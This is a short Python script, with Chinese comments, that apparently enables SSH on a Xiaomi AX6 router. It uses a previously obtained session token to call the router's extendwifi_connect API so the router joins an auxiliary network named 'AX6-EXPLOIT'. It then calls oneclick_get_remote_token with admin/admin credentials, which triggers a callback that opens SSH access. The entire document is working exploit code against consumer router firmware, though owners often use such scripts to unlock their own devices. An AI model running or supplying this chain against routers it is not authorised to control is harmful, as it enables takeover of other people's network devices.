#!/usr/bin/env python3
"""
AX6 SSH 开启脚本

需要预先从 login_get_stok.py 获取 stok。
只做两件事：extendwifi_connect → oneclick_get_remote_token
"""

import json
import sys
import time
import urllib.parse
import urllib.request
import argparse


def http_get(url: str, timeout: int = 120) -> dict:
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def main():
    parser = argparse.ArgumentParser(description="AX6 SSH 开启脚本")
    parser.add_argument("--ip", default="192.168.31.1", help="AX6 IP (默认: 192.168.31.1)")
    parser.add_argument("--stok", required=True, help="stok 令牌 (由 login_get_stok.py 获取)")
    parser.add_argument("--aux-ssid", default="AX6-EXPLOIT", help="辅助 WiFi SSID (默认: AX6-EXPLOIT)")
    parser.add_argument("--aux-pwd", default="12345678", help="辅助 WiFi 密码 (默认: 12345678)")
    args = parser.parse_args()

    stok = args.stok
    base = f"http://{args.ip}/cgi-bin/luci/;stok={stok}"

    # Step 1: extendwifi_connect
    print("[1/2] 连接辅助 WiFi {} ...".format(args.aux_ssid), file=sys.stderr)
    url1 = (f"{base}/api/misystem/extendwifi_connect"
            f"?ssid={urllib.parse.quote(args.aux_ssid)}"
            f"&password={urllib.parse.quote(args.aux_pwd)}")
    r1 = http_get(url1)
    if r1.get("code") != 0:
        print(json.dumps({"error": f"extendwifi_connect 失败: {r1}"}))
        sys.exit(1)

    time.sleep(3)

    # Step 2: oneclick_get_remote_token
    print("[2/2] 触发 AX6 回调拿 token ...", file=sys.stderr)
    url2 = (f"{base}/api/xqsystem/oneclick_get_remote_token"
            f"?username=admin&password=admin&nonce=0__{int(time.time())}_0")
    r2 = http_get(url2, timeout=30)

    print(json.dumps({
        "stok": stok,
        "extendwifi_code": r1.get("code"),
        "token_result": r2,
        "note": "SSH 密码 = 5GHz WiFi 密码，请查看 AX6 前端",
    }))

    if r2.get("code") != 0:
        print(json.dumps({"warning": f"token 获取异常: {r2}"}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
